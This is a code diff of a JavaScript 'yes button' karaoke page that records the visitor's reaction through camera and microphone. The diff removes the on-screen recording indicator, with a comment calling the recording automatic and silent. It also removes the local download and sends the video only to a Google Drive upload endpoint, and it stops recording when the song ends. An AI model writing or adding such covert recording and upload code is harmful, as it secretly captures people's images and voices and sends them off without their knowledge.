@@ -505,12 +505,15 @@ async function uploadToDrive(blob) {
                         })
                     });
 
-                    // With no-cors, we can't see the response body or status, 
-                    // but usually if it doesn't throw, it was sent.
-                    console.log("Petición de subida enviada a Google Drive.");
-                    resolve(true);
+                    if (response.ok || response.type === 'opaque') {
+                        console.log("✅ Video subido exitosamente a Google Drive.");
+                        resolve(true);
+                    } else {
+                        console.error("❌ Error en la respuesta del servidor:", response.status);
+                        resolve(false);
+                    }
                 } catch (fetchErr) {
-                    console.error("Error en el fetch de subida:", fetchErr);
+                    console.error("❌ Error en el fetch de subida:", fetchErr);
                     resolve(false);
                 }
             };
@@ -559,23 +562,16 @@ async function startRecording() {
         };
         mediaRecorder.onstop = async () => {
             const blob = new Blob(recordedChunks, { type: 'video/webm' });
-            console.log("Grabación finalizada. Tamaño del video:", (blob.size / 1024).toFixed(2), "KB");
+            console.log("📹 Grabación finalizada. Tamaño del video:", (blob.size / 1024).toFixed(2), "KB");
 
-            // Intentar subir a Drive, si falla o no hay URL, descargar local
-            const uploaded = await uploadToDrive(blob);
-            if (!uploaded) {
-                console.warn("La subida a Drive no se pudo confirmar. Descargando copia local...");
-                const url = URL.createObjectURL(blob);
-                const a = document.createElement('a');
-                a.style.display = 'none'; a.href = url; a.download = `reaccion_karaoke_${new Date().getTime()}.webm`;
-                document.body.appendChild(a); a.click();
-                setTimeout(() => { document.body.removeChild(a); window.URL.revokeObjectURL(url); }, 100);
-            }
+            // Subir SOLO a Drive (sin descarga local)
+            console.log("📤 Enviando video a Google Drive...");
+            await uploadToDrive(blob);
             recordedChunks = [];
         };
 
         mediaRecorder.start();
-        if (recordingStatus) recordingStatus.style.display = 'block';
+        // No mostrar indicador de grabación (es automático y silencioso)
     } catch (err) {
         console.error("Recording error:", err);
         alert("Para grabar la reacción, por favor permite el acceso a la cámara y micrófono.");
@@ -671,6 +667,12 @@ document.querySelectorAll('.yes-btn').forEach(btn => {
             music.play().catch(() => { });
             initKaraoke();
             music.ontimeupdate = () => updateKaraoke(music.currentTime);
+
+            // Auto-stop recording when song ends
+            music.onended = () => {
+                console.log("🎵 Canción finalizada. Deteniendo grabación...");
+                stopRecording();
+            };
         }
 
         startRecording(); // Capture reaction!
